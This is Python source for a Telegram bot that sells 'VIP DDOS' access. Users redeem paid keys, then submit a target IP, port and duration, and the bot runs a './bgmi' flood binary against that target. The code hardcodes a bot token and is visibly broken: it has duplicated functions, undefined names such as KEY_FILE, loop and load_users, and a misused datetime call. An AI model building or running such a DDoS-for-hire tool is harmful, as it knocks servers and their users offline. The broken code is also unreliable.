import time
import logging
import json
import os
from threading import Thread
import telebot
import asyncio
import random
import string
from datetime import datetime, timedelta
from keepalive import keep_alive
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from telebot.apihelper import ApiTelegramException

ADMIN_IDS = [7161052001]
BOT_TOKEN = "7003192552:AAF8OLRd2cKv5T9geHnxDVKGOWWWSCQP8fo"

bot = telebot.TeleBot(BOT_TOKEN)
redeemed_keys = set()

# File paths
USERS_FILE = 'users.txt'
KEYS_FILE = 'keys.json'
keys = {}

# Track ongoing attack processes
ongoing_attacks = {}

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

# Function to run two binaries at the same time
async def run_attack_command_async(target_ip, target_port, duration):
    # Start both binaries as subprocesses
    process1 = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration}")    
    # Wait for both processes to complete
    await asyncio.gather(
        process1.communicate(),
)

def load_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, 'r') as file:
            return json.load(file)
    return {}

def save_keys(keys):
    with open(KEYS_FILE, 'w') as file:
        json.dump(keys, file, indent=4)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}
def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)
def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))
def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲 𝗸𝗲𝘆\n {key}\n𝗩𝗮𝗹𝗶𝗱𝗶𝘁𝘆\n {expiration_date}\n\n𝙀𝙉𝙏𝙀𝙍 𝙆𝙀𝙔 𝘽𝙊𝙏 𝙇𝙄𝙆𝙀 --> \n/𝙧𝙚𝙙𝙚𝙚𝙢"
            except ValueError:
                response = f"📵 𝙀𝙍𝙍𝙊𝙍 𝘿𝙈 📵 --> @OneTwoThreeSK"
        else:
            response = "📵 𝙀𝙍𝙍𝙊𝙍 𝘿𝙈 📵 --> @OneTwoThreeSK"
    else:
        response = f"📵 𝙀𝙍𝙍𝙊𝙍 𝘿𝙈 📵 --> @OneTwoThreeSK"

@bot.message_handler(func=lambda message: message.text == "🔑 REDEEM KEY")
def redeem_key_command(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "Please enter your key:")
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    key = message.text.strip()

    keys = load_keys()
    users = load_users()

    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if found_user:
        bot.send_message(chat_id, "You have already redeemed a key.")
        return

    if key not in keys or keys[key]['redeemed']:
        bot.send_message(chat_id, "Invalid or already redeemed key.")
        return

    keys[key]['redeemed'] = True
    save_keys(keys)

    expiration_time = datetime.now() + timedelta(days=keys[key]['duration'])
    new_user = {
        'user_id': user_id,
        'username': message.from_user.username,
        'expiration_time': expiration_time.strftime("%Y-%m-%d %H:%M:%S")
    }
    users.append(new_user)
    save_users(users)

    bot.send_message(chat_id, "🔑 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇 𝙆𝙀𝙔 𝙍𝙀𝘿𝙀𝙀𝙈", reply_markup=main_menu())

def main_menu():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(KeyboardButton("🔑 REDEEM KEY"))
    keyboard.add(KeyboardButton("🚀 START ATTACK"),KeyboardButton("🛑 STOP ATTACK"))
    keyboard.add(KeyboardButton("🔐 GENKEY"))
    keyboard.add(KeyboardButton("🪪 INFO"))
    return keyboard

@bot.message_handler(commands=['start'])
def start_command(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "WELCOME TO 🥇PREMIUM🥇 USER--> @OneTwoThreeSK.", reply_markup=main_menu())

@bot.message_handler(func=lambda message: message.text == "🚀 START ATTACK")
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    users = load_users()
    found_user = next((user for user in users if user['user_id'] == user_id), None)

    if not found_user:
        bot.send_message(chat_id, "You are not registered. Please redeem a key first.")
        return

    bot.send_message(chat_id, "🚀 USER---> IP PORT TIME")
    bot.register_next_step_handler(message, process_attack_command, chat_id)

def process_attack_command(message, chat_id):
    args = message.text.split()
    
    if len(args) != 3:
        bot.send_message(chat_id, "🚀 USER---> IP PORT TIME")
        return

    target_ip = args[0]

    try:
        target_port = int(args[1])
    except ValueError:
        bot.send_message(chat_id, "Port must be a valid number.")
        return

    try:
        duration = int(args[2])
    except ValueError:
        bot.send_message(chat_id, "Duration must be a valid number.")
        return

    if target_port in blocked_ports:
        bot.send_message(chat_id, f"Port {target_port} is blocked. Please use a different port.")
        return

    if chat_id in ongoing_attacks:
        bot.send_message(chat_id, "🛑 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝙊𝙋 🛑\n\nʏᴏᴜ ᴀʀᴇ ᴀᴛᴛᴀᴄᴋ ʜᴀꜱ ʙᴇᴇɴ ꜱᴛᴏᴘᴘᴇᴅ ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴀɴᴏᴛʜᴇʀ ᴀᴛᴛᴀᴄᴋ \nʟɪᴋᴇ /ʙɢᴍɪ ᴛᴀʀɢᴇᴛ ᴘᴏʀᴛ ᴛɪᴍᴇ\nᴛᴀᴘ ᴛᴏ ᴀɢᴀɪɴ ꜱᴛᴀʀᴛ :- /start\n\n🇮🇳 𝙑𝙄𝙋 𝘿𝘿𝙊𝙎")
        return

    asyncio.run_coroutine_threadsafe(run_attack_command_on_codespace(target_ip, target_port, duration, chat_id), loop)
    bot.send_message(chat_id, f"ATTACK START 🚀\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}", reply_markup=main_menu())

keep_alive()
bot.polling(none_stop=True)
  